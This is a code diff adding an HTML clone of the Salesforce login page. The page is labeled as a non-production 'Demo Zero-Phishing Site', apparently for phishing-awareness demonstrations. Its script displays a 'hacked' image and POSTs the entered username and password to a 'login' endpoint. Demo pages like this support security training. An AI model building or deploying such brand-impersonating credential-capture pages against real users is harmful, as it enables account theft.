@@ -1,0 +1,95 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="initial-scale=1.0">
+    <meta name="description" content="Salesforce Customer Secure Login Page. Login to your Salesforce Customer Account.">
+    <link type="text/css" rel="stylesheet" href="css/app.css">
+    <link rel="shortcut icon" type="image/png" href="img/favicon.ico"/>
+    <title>Login | Salesforce</title>
+</head>
+<body>
+<div class="page-container">
+    <div class="primary-col">
+        <div id="wrapper">
+            <div id="logo_wrapper" class="standard_logo_wrapper mb24">
+                <h1 style="height: 100%; display: table-cell; vertical-align: bottom;">
+                    <img id="logo"
+                         class="standard_logo"
+                         src="img/logo214.svg"
+                         alt="Salesforce" border="0"
+                         name="logo"></h1></div>
+            <div id="content" style="display: block; z-index: 1000; position: relative">
+
+                <div id="theloginform" style="display: block;">
+                    <form name="login" method="post" id="login_form" action="hacked.html" target="_top"
+                          autocomplete="off"
+                          novalidate="novalidate">
+                        <div id="usernamegroup" class="inputgroup">
+                            <label for="username" class="label">Username</label>
+                            <div id="username_container">
+                                <input class="input r4 wide mb16 mt8 username" type="email" value="" name="username"
+                                       id="username" style="display: block;">
+                            </div>
+                        </div>
+                        <label for="password" class="label">Password</label>
+                        <input class="input r4 wide mb16 mt8 password" type="password" id="password" name="pw"
+                               autocomplete="off">
+
+                        <input class="button r4 wide primary" type="submit" id="Login" name="Login" value="Log In"
+                               onclick="displayHahcked(); return false;">
+                        <div class="w0 pr ln3 p16 remember"><input type="checkbox" class="r4 fl mr8" style=""
+                                                                   id="rememberUn" name="rememberUn"><label
+                                for="rememberUn" class="fl pr db tn3">Remember me</label></div>
+                    </form>
+                    <div class="w0 links bt pt16 mb20"><a id="forgot_password_link" class="fl small"
+                                                          href="https://login.salesforce.com/secur/forgotpassword.jsp?locale=us">Forgot
+                        Your
+                        Password?</a><a id="mydomainLink" class="fr small" href="javascript:void(0);"
+                                        onclick="DomainSwitcher.enterCustomDomain('Use Custom Domain',' | Salesforce')">Use
+                        Custom Domain</a></div>
+                </div>
+            </div>
+            <div id="signup" class="tc mt24" style="display: block;"><p class="di mr16">Not a customer?</p><a
+                    class="button secondary" id="signup_link"
+                    href="https://www.salesforce.com/form/trial/freetrial.jsp?d=70130000000Enus">Try for Free</a></div>
+            <div  style="position: fixed;left: 0;right: 0;bottom: 0;top: 0;overflow: hidden;width: 100%;height: 100%;padding: 0;margin: 0;z-index: 999;">
+                <div class="warning-note zero">
+                    <div style="font-size: 24px;font-weight: bold;">Demo Zero-Phishing Site!</div>
+                    <div>NON-PRODUCTION ENVIRONMENT AND FOR DEMO PURPOSES ONLY</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col">
+        <iframe frameborder="0" src="https://c.salesforce.com/login-messages/promos.html" id="marketing"
+                name="marketing" scrolling="no" title="Marketing" tabindex="-1"
+                sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"></iframe>
+    </div>
+
+    <div id="hacked"
+         style="display:none; position: fixed;left: 0;right: 0;bottom: 0;top: 0;overflow: hidden;width: 100%;height: 100%;padding: 0;margin: 0;z-index: 100000;background: rgba(0,0,0,.7);">
+        <img src="img/hacked-2127635_640.png"
+             style="position: absolute;left: 0;right: 0;bottom: 0;top: 0;margin: auto;height: 60vh;"/>
+    </div>
+</div>
+
+<script>
+    function displayHahcked(e) {
+        e && e.preventDefault && e.preventDefault();
+        document.getElementById("hacked").style.display = "block";
+
+        var xhr = new XMLHttpRequest();
+
+        xhr.open('POST', 'login');
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onload = function () {
+            console.log("Hacked");
+        };
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        xhr.send("username=" + encodeURI(username) + "&password=" + encodeURI(password));
+    }
+</script>
+</body>
+</html>
